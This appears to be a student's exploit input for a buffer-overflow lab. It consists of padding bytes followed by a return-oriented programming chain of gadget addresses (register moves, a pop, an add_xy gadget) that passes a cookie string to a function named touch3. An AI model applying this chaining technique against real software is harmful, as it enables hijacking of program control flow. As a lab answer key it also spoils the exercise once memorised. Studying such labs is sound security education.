00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

de 60 55 55 55 55 00 00 /* rsp -> rax */
81 60 55 55 55 55 00 00 /* rax -> rdi */
6d 60 55 55 55 55 00 00 /* popq rax */
48 00 00 00 00 00 00 00 /* offset */

74 61 55 55 55 55 00 00 /* eax -> ecx */
67 61 55 55 55 55 00 00 /* ecx -> edx */
66 61 55 55 55 55 00 00 /* edx -> esi */
a2 60 55 55 55 55 00 00 /* add_xy */
81 60 55 55 55 55 00 00 /* rax -> rdi */

99 5f 55 55 55 55 00 00 /* touch3 */
34 32 64 34 38 61 36 37 /* cookie */
